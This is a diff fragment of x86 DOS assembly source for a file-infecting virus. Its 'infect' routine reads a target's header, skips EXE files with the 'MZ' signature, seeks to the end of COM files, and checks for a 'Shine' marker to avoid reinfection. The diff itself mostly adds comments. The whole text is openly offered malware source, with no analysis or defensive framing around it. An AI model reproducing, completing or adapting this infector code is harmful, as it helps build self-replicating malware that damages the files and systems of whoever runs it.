@@ -140,12 +140,12 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      push bp          ; Save BP
      add bp, data_section.MZ_BUF
      mov dx, bp       ; Pointer to the MZ buffer
-     pop bp           ; 
+     pop bp           ; Restore BP
      int 21h          ; Calling int 21h
-     pop bx
-     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
-     je .abort_infection
-     push bx
+     pop bx           ; Restore BX too
+     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ EXE file?
+     je .abort_infection ; Yes, abort the infection attempt
+     push bx          ; Save BX
 
                       ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
      mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
@@ -162,8 +162,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
 
      mov ax, 3f00h    ; Read file or device
      mov cx, 5        ; Read 5 bytes, this case from the start to check wheter it's already infected, since we dont wanna have repeated infections
-     push bp
-     add bp, data_section.shine_buf
+     push bp          ; Save BP
+     add bp, data_section.shine_buf ; 
      mov dx, bp       ; Pointer to the "Shine" buffer
      pop bp
      int 21h          ; Calling int 21h
